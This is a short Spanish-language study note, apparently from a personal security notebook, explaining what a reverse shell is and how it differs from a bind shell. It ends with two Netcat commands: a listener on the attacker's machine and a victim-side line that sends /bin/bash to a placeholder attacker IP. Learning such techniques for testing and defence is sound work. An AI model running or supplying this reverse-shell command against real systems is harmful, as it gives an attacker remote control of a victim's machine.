-------------------------
- Tags: #tecnica #remoto #explotacion
------------------------------
# Definición

> Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia una máquina del atacante, permitiéndole tomar el control de la máquina remota.

> Cuando hablamos de una **`reverse shell`**, hacemos referencia a un método inverso en comparación a la típica [[Bind Shell]]. En este caso, es el servidor web, quien se conecta a la maquina del atacante (antes referenciada como cliente). Para ello, lo que hacemos es levantar un servicio en la maquina del atacante, en un puerto de escucha. Luego el servidor web se conecta a esta pasándole como referencia la [[shell]] del mismo servidor.

![[Pasted image 20230826120135.png]]

>Los atacantes que realizan una **`reverse shell`**, muchas veces hacen uso de los servicios de VPS, en donde pueden tener direcciones IP publicas y configurar las reglas del gateway, para poder establecer la conexión entrante de la víctima y así poder ejecutar comandos en el sistema operativo.

> La **`reverse shell`** con [[Netcat]] se puede crear con el siguiente comando:

**Máquina del atacante**
```bash
nc -lvp 4444
```

**Servidor web**
```bash
nc IP-MAQUINA ATACANTE 4444 -e /bin/bash
```
